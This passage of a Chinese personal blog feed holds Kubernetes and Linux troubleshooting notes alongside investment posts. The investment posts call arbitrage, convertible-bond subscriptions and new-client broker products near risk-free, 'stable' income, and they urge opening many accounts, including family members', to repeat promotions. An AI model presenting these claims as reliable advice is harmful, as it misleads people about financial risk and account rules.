class="variable">$&#123;KUBECTL_BIN&#125;</span> <span class="variable">$@</span> 2&gt;<span class="string">&quot;<span class="variable">$tmpfile</span>&quot;</span></span><br><span class="line">        ret=$?</span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$ret</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">            debuglog <span class="string">&quot;KUBECTL <span class="variable">$cmdstr</span> ret: 0&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">local</span> errinfo=$(&lt; <span class="string">&quot;<span class="variable">$tmpfile</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">local</span> need_retry=<span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_K8S_NOTRUNNING</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_CONNECTION_TIMEOUT</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ -n <span class="string">&quot;<span class="subst">$(echo <span class="string">&quot;<span class="variable">$errinfo</span>&quot;</span> | grep <span class="string">&quot;<span class="variable">$ERR_MSG_CONNECTION_REFUSED</span>&quot;</span>)</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> [ <span class="variable">$ret</span> -eq 143 ]; <span class="keyword">then</span> <span class="comment"># 143 means SIGTERM, just retry</span></span><br><span class="line">            need_retry=<span class="string">&quot;yes&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            need_retry=<span class="string">&quot;no&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> [ <span class="variable">$need_retry</span> != <span class="string">&quot;yes&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            debuglog <span class="string">&quot;KUBECTL ret: <span class="variable">$ret</span>/(<span class="variable">$errinfo</span>) <span class="variable">$cmdstr</span>&quot;</span></span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">        debuglog <span class="string">&quot;KUBECTL ret: <span class="variable">$ret</span>/(<span class="variable">$errinfo</span>) (retry:<span class="variable">$i</span>) <span class="variable">$cmdstr</span>&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 30</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="built_in">rm</span> -- <span class="variable">$&#123;tmpfile&#125;</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$ret</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">api_kubectl</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> args=(3 <span class="string">&quot;<span class="variable">$@</span>&quot;</span>)</span><br><span class="line">    api_kubectlX <span class="string">&quot;<span class="variable">$&#123;args[@]&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span> $?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用方法：</span></span><br><span class="line">api_kubectl get ns</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>k8s</category>
      </categories>
      <tags>
        <tag>k8s</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Microk8s dqlite启动失败, raft_start(): io: load closed segment XXX: entries count in preamble is zero</title>
    <url>/2024/03/28/2024-03-28-microk8s-dqlite-run-fail/</url>
    <content><![CDATA[<h2 id="定位步骤"><a href="#定位步骤" class="headerlink" title="定位步骤"></a>定位步骤</h2><p>后台查看Microk8s相关进程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  7281 ?        Ss    27:02 /bin/bash /var/lib/snapd/snap/microk8s/3699/apiservice-kicker</span><br><span class="line">749807 ?        S      0:00  \_ sleep 5</span><br><span class="line">  7290 ?        Ss     0:00 /bin/bash /var/lib/snapd/snap/microk8s/3699/run-cluster-agent-with-args</span><br><span class="line">  7362 ?        S      2:32  \_ python3 /snap/microk8s/3699/usr/bin/gunicorn3 cluster.agent:app --bind 0.0.0.0:25000 --keyfile /var/snap/microk8s/3699/certs/server.key --certfile /var/snap/microk8s/3699/certs/server.crt --timeout 240</span><br><span class="line">  7684 ?        S      0:02      \_ python3 /snap/microk8s/3699/usr/bin/gunicorn3 cluster.agent:app --bind 0.0.0.0:25000 --keyfile /var/snap/microk8s/3699/certs/server.key --certfile /var/snap/microk8s/3699/certs/server.crt --timeout 240</span><br><span class="line">  7310 ?        Ssl  399:16 /snap/microk8s/3699/bin/containerd --config /var/snap/microk8s/3699/args/containerd.toml --root /var/snap/microk8s/common/var/lib/containerd --state /var/snap/microk8s/common/run/containerd --address /var/snap/microk8s/common/run/containerd.sock</span><br></pre></td></tr></table></figure>
<p>和正常环境对比，发现<code>k8s-dqlite</code>, <code>kubelite</code>进程执行异常，如下：</p>
<span id="more"></span>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7457 ?        Ssl  752:10 /snap/microk8s/3699/bin/k8s-dqlite --storage-dir=/var/snap/microk8s/3699/var/kubernetes/backend/ --listen=unix:///var/snap/microk8s/3699/var/kubernetes/backend/kine.sock:12379</span><br><span class="line">7489 ?        Ssl  1777:58 /snap/microk8s/3699/kubelite --scheduler-args-file=/var/snap/microk8s/3699/args/kube-scheduler --controller-manager-args-file=/var/snap/microk8s/3699/args/kube-controller-manager --proxy-args-file=/var/snap/microk8s/3699/args/kube-proxy --kubelet-args-file=/var/snap/microk8s/3699/args/kubelet --apiserver-args-file=/var/snap/microk8s/3699/args/kube-apiserver</span><br></pre></td></tr></table></figure>
<p>通过<code>journactl</code>查看错误日志:<br>fatal msg&#x3D;”Failed to start server: start node: raft_start(): io: <strong>load closed segment 0000000014232389-0000000014232597</strong>: entries batch 394 starting at byte 8384000: entries count in preamble is zero\n”<br>Feb 03 08:18:08 GIFOCTMSG02 systemd[1]: snap.microk8s.daemon-k8s-dqlite.service: Main process exited, code&#x3D;exited, status&#x3D;1&#x2F;FAILURE</p>
<p>根据关键字查Google找到解决方案：<a href="https://discuss.linuxcontainers.org/t/error-failed-to-start-dqlite-server-raft-start/6931">https://discuss.linuxcontainers.org/t/error-failed-to-start-dqlite-server-raft-start/6931</a></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>根据错误日志中”segment <strong>0000000014232389-0000000014232597</strong>“的信息，找到出错的文件<code>/var/snap/microk8s/current/var/kubernetes/backend/0000000014232389-0000000014232597</code>，删除此文件后重启microk8s，发现问题解决。文件出错原因可能是因为机器被异常下电，导致文件损坏</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s stop</span><br><span class="line">rm /var/snap/microk8s/current/var/kubernetes/backend/0000000014232389-0000000014232597</span><br><span class="line">microk8s start</span><br></pre></td></tr></table></figure>
<p><code>/var/snap/microk8s/3699/var/kubernetes/backend</code>的文件如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ll /var/snap/microk8s/3699/var/kubernetes/backend</span><br><span class="line">total 153212</span><br><span class="line">-rw-rw---- 1 root microk8s 8381624 Jan 28 00:11 0000000014225187-0000000014225660</span><br><span class="line">-rw-rw---- 1 root microk8s 8386880 Jan 28 00:12 0000000014225661-0000000014226264</span><br><span class="line">-rw-rw---- 1 root microk8s 8386016 Jan 28 00:16 0000000014226265-0000000014226628</span><br><span class="line">-rw-rw---- 1 root microk8s 8381552 Jan 28 00:16 0000000014226629-0000000014227272</span><br><span class="line">-rw-rw---- 1 root microk8s 8378744 Jan 28 00:19 0000000014227273-0000000014227706</span><br><span class="line">-rw-rw---- 1 root microk8s 8362544 Jan 28 00:21 0000000014227707-0000000014228257</span><br><span class="line">-rw-rw---- 1 root microk8s 8377520 Jan 28 00:23 0000000014228258-0000000014228788</span><br><span class="line">-rw-rw---- 1 root microk8s 8386592 Jan 28 00:26 0000000014228789-0000000014229217</span><br><span class="line">-rw-rw---- 1 root microk8s 8368952 Jan 28 00:26 0000000014229218-0000000014229857</span><br><span class="line">-rw-rw---- 1 root microk8s 8361608 Jan 28 00:30 0000000014229858-0000000014230224</span><br><span class="line">-rw-rw---- 1 root microk8s 8387384 Jan 28 00:31 0000000014230225-0000000014230835</span><br><span class="line">-rw-rw---- 1 root microk8s 8377232 Jan 28 00:34 0000000014230836-0000000014231305</span><br><span class="line">-rw-rw---- 1 root microk8s 8387384 Jan 28 00:36 0000000014231306-0000000014231802</span><br><span class="line">-rw-rw---- 1 root microk8s 8373272 Jan 28 00:37 0000000014231803-0000000014232388</span><br><span class="line">-rw-rw---- 1 root microk8s 8384512 Jan 28 00:41 0000000014232389-0000000014232597</span><br><span class="line">-rw-rw---- 1 root microk8s      80 Jan 28 00:40 0000000014232598-0000000014232598</span><br><span class="line">-rw-rw---- 1 root microk8s    1883 Dec 14 03:38 cluster.crt</span><br><span class="line">-rw-rw---- 1 root microk8s    3272 Dec 14 03:38 cluster.key</span><br><span class="line">-rw-rw---- 1 root microk8s      63 Feb  4 03:11 cluster.yaml</span><br><span class="line">-rw-rw-r-- 1 root microk8s       2 Feb  4 03:12 failure-domain</span><br><span class="line">-rw-rw---- 1 root microk8s      57 Dec 14 03:38 info.yaml</span><br><span class="line">-rw-rw-r-- 1 root microk8s       0 Feb  2 10:24 kine.sock</span><br><span class="line">-rw-rw---- 1 root microk8s      63 Dec 19 07:56 localnode.yaml</span><br><span class="line">-rw-rw---- 1 root microk8s      32 Dec 14 03:38 metadata1</span><br><span class="line">-rw-rw---- 1 root microk8s 8388608 Jan 28 00:41 open-28053</span><br><span class="line">-rw-rw---- 1 root microk8s 8388608 Jan 28 00:41 open-28054</span><br><span class="line">-rw-rw---- 1 root microk8s 8388608 Jan 28 00:45 open-28055</span><br><span class="line">-rw-rw---- 1 root microk8s 3069878 Jan 28 00:40 snapshot-1-14232647-3429895302</span><br><span class="line">-rw-rw---- 1 root microk8s      72 Jan 28 00:40 snapshot-1-14232647-3429895302.meta</span><br><span class="line">-rw-rw---- 1 root microk8s 2893883 Jan 28 00:43 snapshot-1-14233671-3430050282</span><br><span class="line">-rw-rw---- 1 root microk8s      72 Jan 28 00:43 snapshot-1-14233671-3430050282.meta</span><br></pre></td></tr></table></figure>
<p>每个文件的作用：</p>
<ul>
<li>数据段文件（如：0000000014225187-0000000014225660）：<br>这些文件包含 dqlite 存储的实际数据段。每个文件代表一个数据段，存储着相应的数据。这些文件在 dqlite 数据库引擎中用于持久性地存储数据。</li>
<li>索引段文件（如：0000000014225661-0000000014226264）：<br>类似于数据段文件，这些文件包含 dqlite 存储的索引段，用于加速数据检索。</li>
<li>快照文件（如：snapshot-1-14232647-3429895302）：<br>这些文件包含数据库在某个时间点的快照，用于还原数据库状态。在备份和还原过程中，这些文件可能会用到。</li>
<li>信息文件（info.yaml）：<br>这是一个 YAML 格式的文件，包含有关 dqlite 数据库的一些元信息。</li>
<li>配置文件（cluster.yaml）：<br>包含 dqlite 集群的配置信息，例如节点地址、端口等。</li>
<li>证书文件（cluster.crt、cluster.key）：<br>这是用于在 dqlite 集群中进行安全通信的证书文件。</li>
<li>本地节点配置文件（localnode.yaml）：<br>包含本地节点的配置信息，例如节点 ID。</li>
<li>元数据文件（metadata1）：<br>存储 dqlite 内部使用的一些元数据信息。</li>
<li>打开文件（如：open-28055）：<br>这些文件可能是当前正在使用的打开文件。它们通常在 dqlite 服务正在运行时存在。</li>
<li>失败域文件（failure-domain）：<br>可能包含关于节点失败域的信息，用于高可用性和容错。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://discuss.linuxcontainers.org/t/error-failed-to-start-dqlite-server-raft-start/6931">https://discuss.linuxcontainers.org/t/error-failed-to-start-dqlite-server-raft-start/6931</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>股票账户除了炒股还能做什么?</title>
    <url>/2024/03/31/2024-03-31-what-else-can-a-stock-account-do-besides-trade-stock/</url>
    <content><![CDATA[<p>除了炒股，股票账户还有哪些功能？开股票账户是不是和去赌场赌博是一回事？股票账户有靠谱的赚钱手艺吗？</p>
<p>我的回答是：<strong>股票账户当然能赚钱，而且股票账户的功能非常丰富，可以是说现代投资理财必备工具</strong>。下面我介绍几个我常用的低风险投资工具，供大家参考：</p>
<span id="more"></span>

<h2 id="1-购买国债逆回购、货币基金等短期资金管理工具"><a href="#1-购买国债逆回购、货币基金等短期资金管理工具" class="headerlink" title="1. 购买国债逆回购、货币基金等短期资金管理工具"></a>1. 购买国债逆回购、货币基金等短期资金管理工具</h2><p>我通常把3年内可能会用掉的钱看作短期资金，这部分钱只能投入到流动性好，风险极低的资产。我最常用的短期资金管理工具是国债逆回购和货币基金：</p>
<h3 id="国债逆回购"><a href="#国债逆回购" class="headerlink" title="国债逆回购"></a>国债逆回购</h3><ul>
<li>逆回购本质是一种短期贷款，你把钱借给别人获得固定的利息收益，别人用自己的国债作为抵押获得这笔借款，到期还本付息，逆回购的安全性等同于国债。</li>
<li>逆回购的流动性好，可根据自己需要选择1天，2天，3天，4天等不同期限。</li>
<li>在月末季末等资金面紧张的时候，逆回购收益率较高。</li>
<li>在节前倒数第二个交易日购买1天期逆回购，资金只占用1天，可以获得整个节日期间的利息。<br><img src="/2024/03/31/2024-03-31-what-else-can-a-stock-account-do-besides-trade-stock/image1.png"></li>
</ul>
<h3 id="货币基金"><a href="#货币基金" class="headerlink" title="货币基金"></a>货币基金</h3><ul>
<li>货币基金主要投资于国债、央行票据等风险极低的东西，安全性很强。货币基金的收益和逆回购相当。</li>
<li>我通常只买场内交易型货币基金，有两点好处：日内可以随时买入卖出，如果急用钱当天卖出下一个交易日就能取现；价格和净值出现偏离时可以套利。</li>
<li>逆回购搭配“算头不算尾”的场内货币基金，可以实现用7天时间赚9天收益。篇幅所限不展开讨论，有兴趣朋友可自行搜索原理。</li>
</ul>
<h2 id="2-购买券商新客理财"><a href="#2-购买券商新客理财" class="headerlink" title="2. 购买券商新客理财"></a>2. 购买券商新客理财</h2><p>券商新客理财是券商给新客户发行的一种短期理财产品，以质押式报价回购和收益凭证为主。本质上是证券公司向你借钱，投向风险极低的品种，投资期限一般在14天到1个月，约定到期收益6%-8%，说白了就是券商为了拉新倒贴你钱。<br><img src="/2024/03/31/2024-03-31-what-else-can-a-stock-account-do-besides-trade-stock/image2.png"><br>思考题：只有新客户才能买新客理财，一次只能享受14天到1个月的利息，你该如何放大这个收益？</p>
<p>答：你完全可以(用家人的账户)继续购买。如果你不想麻烦家人开户，你一个人也可以开多个证券公司的账户，注意这里的多不是3个5个，而是30个50个甚至100多个，理论上全国有多少券商你就可以开多少个~</p>
<p>要解释这个神奇的BUG，你需要了解<strong>不限三</strong>的概念：<strong>不限制深A股东号，超过三户之后你可以接着开第四家，只需在开户时勾选“转户深A”，即可无限复制深A号，实现无尽开户的概念</strong>。</p>
<p>总结下，券商新客理财适合20万以内的小资金，没必要去瞎炒什么股票，每个月去开户就完事了，稳拿6%-8%收益，再加上券商开户返利，年化10-20%很容易。你只要不嫌麻烦，就能站着把这钱挣了。</p>
<h2 id="3-做基金套利"><a href="#3-做基金套利" class="headerlink" title="3. 做基金套利"></a>3. 做基金套利</h2><p>关于基金套利的原理，简单说就是<strong>从价格低的市场买入，然后到价格高的市场卖出，赚取差价，就像勤劳的搬砖工一样</strong>。</p>
<p>今年短短3个月时间里，出现了非常多的基金套利机会，比如印度基金LOF，全球芯片LOF，标普500LOF，给了我实践套利机会的同时，还顺便让我捡了几千块钱~</p>
<p>至于下一次套利机会什么时候出现，谁也不知道。我们能做的就是提前把工具准备好，多开几个拖拉机户，下次在地上看到钱了，弯个腰，把它捡起来。</p>
<h2 id="4-可转债打新"><a href="#4-可转债打新" class="headerlink" title="4. 可转债打新"></a>4. 可转债打新</h2><p>关于可转债是什么，大家可自行搜索。可转债打新几乎是一门稳赚不赔的手艺，单账户一年期望收益在1000元左右，你自己的再加上父母老婆兄弟姐妹的，一年搞个五六千的无风险收益不难。你只需要做到每次新债不漏申，中签要缴款，有手就行，属于白送的钱。</p>
<p>现在可转债新规，要求2年股票交易经验+10万元资产的参与门槛，我只能说赚钱要趁早。<strong>刚开户的朋友务必记得买卖一手股票(推荐600022)刷下交易经验，等2年时间一到就准备开始捡钱。</strong></p>
<p>想学习可转债的朋友，我推荐以下这几本我看过的书：</p>
<ul>
<li>《攻守：可转债投资实用手册》作者：饕餮海&#x2F;定风波&#x2F;优美</li>
<li>《可转债投资黄金宝典》作者：阿秋</li>
<li>《可转债投资魔法书》作者：安道全</li>
</ul>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux双网卡默认路由优先级不正确，导致网络不通问题定位</title>
    <url>/2024/04/10/2024-04-10-network-failure-due-to-incorrect-default-route-priority-in-dual-nic-linux/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>RHEL9 双网卡环境，两个网卡配置如下：(<strong>eth0 走内网，eth1 走外网</strong>)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eth0  192.168.10.20/24     网关: 192.168.10.254</span><br><span class="line">eth1  10.206.216.92/24     网关: 10.206.216.254</span><br></pre></td></tr></table></figure>
<p>配置完成后，<code>curl https://www.baidu.com</code>访问百度失败，发现网络不通。</p>
<h2 id="定位步骤"><a href="#定位步骤" class="headerlink" title="定位步骤"></a>定位步骤</h2><span id="more"></span>
<p>使用<code>route</code>命令查路由表，发现eth0的默认路由Metric值为100，小于eth1的Metric(101)，这说明eth0默认路由优先级更高，**<code>curl https://www.baidu.com</code> 匹配的是eth0的默认路由，但我们需要通过eth1访问外网**，所以网络不通。<br><img src="/2024/04/10/2024-04-10-network-failure-due-to-incorrect-default-route-priority-in-dual-nic-linux/image1.png"></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>有两种方法，任选其一即可</p>
<h3 id="方法1-手动修改eth0默认路由的metric值，需大于eth1"><a href="#方法1-手动修改eth0默认路由的metric值，需大于eth1" class="headerlink" title="方法1: 手动修改eth0默认路由的metric值，需大于eth1"></a>方法1: 手动修改eth0默认路由的metric值，需大于eth1</h3><p>以下命令设置eth0的默认路由metric值为200，大于eth1的默认路由metric(101)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli connection modify eth0 ipv4.route-metric 200</span><br><span class="line">nmcli c up eth0</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure>
<p>修改重启后仍有效 (配置写在<code>/etc/NetworkManager/system-connections/eth0.nmconnection</code>)</p>
<h3 id="方法2：删除eth0的默认路由，只保留eth1的默认路由"><a href="#方法2：删除eth0的默认路由，只保留eth1的默认路由" class="headerlink" title="方法2：删除eth0的默认路由，只保留eth1的默认路由"></a>方法2：删除eth0的默认路由，只保留eth1的默认路由</h3><p>通过配置<code>ipv4.never-default=no</code>，删除eth0网卡的默认路由，参考如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmcli c mod eth0 ipv4.never-default no gw4 192.168.10.254</span><br><span class="line">nmcli c up eth0</span><br><span class="line">nmcli c reload</span><br></pre></td></tr></table></figure>
<p>修改重启后仍有效 (配置写在<code>/etc/NetworkManager/system-connections/eth0.nmconnection</code>)</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/managing-the-default-gateway-setting_configuring-and-managing-networking">Red Hat Customer Portal – Chapter 23. Managing the default gateway setting</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>troubleshooting</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>Shell函数中使用echo返回了错误字符串问题定位</title>
    <url>/2024/04/12/2024-04-12-echo-return-wrong-str-in-shell/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>在Vmware虚拟机上，执行如下Shell代码获取VM类型</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">get_VM_infra</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> infra=$(dmidecode -t system | grep <span class="string">&quot;Manufacturer&quot;</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$infra</span>&quot;</span> | grep <span class="string">&quot;VMware&quot;</span> <span class="comment"># 判断VM平台类型是否为VMware</span></span><br><span class="line">    <span class="keyword">if</span> [ $? -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;VMware&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Other Type&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">infra=$(get_VM_infra)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;infra: <span class="variable">$infra</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>预期返回<code>&quot;VMware&quot;</code>，实际返回<code>&quot;Manufacturer: VMware, Inc.\nVMware&quot;</code>，这个返回的结果是错误的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># infra:  Manufacturer: VMware, Inc.</span><br><span class="line"># VMware</span><br></pre></td></tr></table></figure>
<h2 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h2><span id="more"></span>
<p>问题出在<code>echo &quot;$infra&quot; | grep &quot;VMware&quot;</code>，<strong>这行代码判断虚拟机类型的时候，也使用了echo，导致返回的字符串多了一行</strong>(Manufacturer: VMware, Inc.)。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>方法1：<br><code>echo &quot;$infra&quot; | grep &quot;VMware&quot;</code> 改成 <code>echo &quot;$infra&quot; | grep &quot;VMware&quot; &gt; /dev/null 2&gt;&amp;1</code></p>
<p>方法2:<br>直接定义全局变量保存字符串，回避echo语句的副作用</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://linuxsimply.com/bash-scripting-tutorial/functions/return-values/return-string-function/">How to Return String From Bash Function</a></p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>投资组合中是否应该包括黄金</title>
    <url>/2024/04/13/2024-04-13-should-gold-be-included-in-an-investment-portfolio/</url>
    <content><![CDATA[<p>最近有朋友问我，你对黄金怎么看？现在可以买黄金吗？</p>
<p>这些问题问的很好啊。首先表明我的观点：<font color=red><strong>黄金是投机不是投资，黄金的长期投资价值极低</strong></font>，在我的投资组合中配置黄金的比例不会超过5%。</p>
<p>可能有些朋友会反对：你谁啊，一句话把黄金贴个投机的标签，我几年前300多元一克买的黄金放到现在已经赚麻了，你懂不懂黄金啊？</p>
<p>的确，构建投资组合时是否应包含黄金，是一个备受争议的话题。下面我分别给出买黄金和不买黄金的理由，供大家参考。</p>
<span id="more"></span>

<h2 id="配置黄金的理由"><a href="#配置黄金的理由" class="headerlink" title="配置黄金的理由"></a>配置黄金的理由</h2><p><strong>1. 避险保值，抵御通胀</strong></p>
<p>黄金作为一种避险资产，在经济不稳定或通胀预期上升时往往表现较好，有对冲货币贬值的作用。</p>
<p>你买的股票可能会破产，债券可能会违约，但是黄金的价格不会跌到零。</p>
<p><strong>2. 资产多样化，降低投资组合风险</strong></p>
<p>黄金的价格和股票、债券相关性低。<font color=red><strong>将投资组合分散到黄金、债券、股票等几种不相关的资产中，可以在不牺牲预期收益的同时降低风险，从而获得一份”免费的午餐”</strong></font>，这就是著名的资产配置理论。</p>
<p>对资产配置感兴趣的朋友，我推荐威廉·伯恩斯坦的《有效资产管理》，值得反复阅读。</p>
<h2 id="不配置黄金的理由"><a href="#不配置黄金的理由" class="headerlink" title="不配置黄金的理由"></a>不配置黄金的理由</h2><p><strong>1. 本身没有内在回报，其回报基于博傻</strong></p>
<p>我们知道，投资股票有红利收入，债券有利息收入，房地产有租金收入，这些都是生息资产，可以创造现金流。</p>
<p>但是黄金属于不创造现金流的资产，本身没有内在回报，难以估值，就像古董，字画一样，其回报只能基于博傻，指望别人出更高的价格接你的盘。</p>
<p><font color='red'><strong>投资和投机最大的区别在于，你需要预测的对象是内在回报还是市场情绪。</strong></font>从这个角度看，我认为黄金仅有投机价值，而投机想要获利，你就必须正确预测市场情绪，预判他人的行为，这是远远超出我能力圈的事情，我不会参与这种游戏。</p>
<p><strong>2. 风险溢价几乎为零</strong></p>
<p>风险溢价（Risk premium）指的是投资者在一段时间内持有风险资产的预期回报率相对于无风险资产的超额回报率。</p>
<p>杰里米·西格尔教授在他的经典之作《股市长线法宝》(Stocks for the long run)中，给出了各资产在1802-2012年的真实收益：<br><img src="/2024/04/13/2024-04-13-should-gold-be-included-in-an-investment-portfolio/image1.png"><br>可以看出，在210年的时间内，<font color='red'><strong>一个充分分散的股票投资组合的年平均真实收益率为6.6%，短期债券为2.7%, 而黄金的真实收益率仅有0.7%，风险溢价几乎是零</strong></font>。</p>
<p>也就是说，投资者持有黄金，承担了和股票类似的价格波动，但回报远不如股票，甚至不如无风险的短期国债。那我不如持有无风险的短期国债，既获得了和黄金类似的回报，又不用承担价格波动的风险，何乐不为呢？</p>
<p>行文至此，对于仍然想要配置黄金的朋友，我建议不要着急，先思考下面几个问题，想明白了再买不迟：</p>
<ul>
<li>我的投资周期到底有多长？</li>
<li>我需要配置多少比例的黄金？</li>
<li>我最多可以忍受多少幅度的下跌？</li>
<li>如何设置止损和止盈？</li>
</ul>
<p>只有事先想清楚这些问题，谋定而后动，才能做出理性的投资决策。</p>
]]></content>
      <categories>
        <category>investment</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>又来！黄金主题LOF溢价40个点开放申购，拖拉机都开冒烟了！</title>
    <url>/2024/04/21/2024-04-21-gold-lof-open-and-my-tractor-is-starting-to-smoke/</url>
    <content><![CDATA[<p>查看基金公告，黄金主题LOF(161116)下周一(4月22号)开放申购，限额100元，目前溢价40%，可以一拖七套利。</p>
<span id="more"></span>
<p><img src="/2024/04/21/2024-04-21-gold-lof-open-and-my-tractor-is-starting-to-smoke/image1.png"></p>
<p>这熟悉的配方，这熟悉的套路！一个月前的今天，我好像在标普500LOF上见过。又是易方达这个狗基，又是限额100元溢价40%，历史总是惊人的相似！</p>
<p>目前全球股市暴跌，中东战乱纷飞，避险情绪强烈，黄金的热度怕是一时半会下不去喽。我算了下，40%的溢价可以扛住3个跌停，限购100元出货压力不大，仓位很低，这个胜率和赔率值得参与。</p>
<p>还记得一周前，我写了篇文章，表示自己不会买黄金这种博傻玩意，现在只能说脸被打的有点疼！架不住易方达这么会玩，场内的雷锋这么热情，我只能说两个字，真香！</p>
<p><img src="/2024/04/21/2024-04-21-gold-lof-open-and-my-tractor-is-starting-to-smoke/image2.png"></p>
<p>不明白什么是一拖七的朋友，可以看我的历史文章。<strong>凡是能够赚钱的手艺，我建议大家要花点时间去自学一下的。几个小时就可以学会的东西，一年捡个几千块钱，不香吗？</strong></p>
]]></content>
      <categories>
        <category>套利往事</category>
      </categories>
      <tags>
        <tag>investment</tag>
      </tags>
  </entry>
  <entry>
    <title>掌握夜市委托，出货快人一步</title>
    <url>/2024/05/19/2024-05-19-learn-night-market-order-and-sell-stock-faster/</url>
    <content><![CDATA[<p>4月22日，黄金LOF（161116）开放申购，限额100元，场内溢价42%，22日场内申购的份额在25日可以卖出。</p>
<span id="more"></span>

<p><img src="/2024/05/19/2024-05-19-learn-night-market-order-and-sell-stock-faster/image1.png"></p>
<p>4月25日，场内新增的申购份额有3318万份，但成交额只有228万，只有不到10%的套利党成功出货。我当天成功出掉一组拖拉机，直接白捡 (1.099-0.924)&#x2F;0.924<em>100</em>7&#x3D;132元</p>
<p>那么，如何成为这顺利吃肉的10%呢？这里我给大家分享两个知识点，教大家今后如何在赌场里捞这种钱。</p>
<h2 id="1-利用夜市委托规则，提前占座"><a href="#1-利用夜市委托规则，提前占座" class="headerlink" title="1. 利用夜市委托规则，提前占座"></a>1. 利用夜市委托规则，提前占座</h2><p>首先，我们要明白A股的交易规则是“价格优先，时间优先”。<font color ='red'><strong>价格优先意味着低价卖出的申报会优先成交；而时间优先则意味着在价格相同时，谁挂单早谁就先成交。</strong></font></p>
